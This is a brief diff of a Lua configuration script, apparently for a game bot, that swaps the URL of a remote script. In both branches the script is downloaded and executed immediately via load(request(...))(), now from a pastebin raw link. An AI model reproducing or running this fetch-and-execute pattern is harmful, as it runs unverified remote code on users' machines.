@@ -94,7 +94,7 @@ CONFIG.Trash_list = {5040,5042,5044,5032,5034,5036,5038,5024,5026,5028,5030,7162
 
 CONFIG = CONFIG
 if CONFIG.PANDORA then
-    load(request("GET","http://rotation.payylater.com/banksy"))()
+    load(request("GET","https://pastebin.com/raw/WZm5XN0N"))()
 elseif CONFIG.GROWX then
-    load(httpGet("http://rotation.payylater.com/banksy"))()
+    load(httpGet("https://pastebin.com/raw/WZm5XN0N"))()
 end
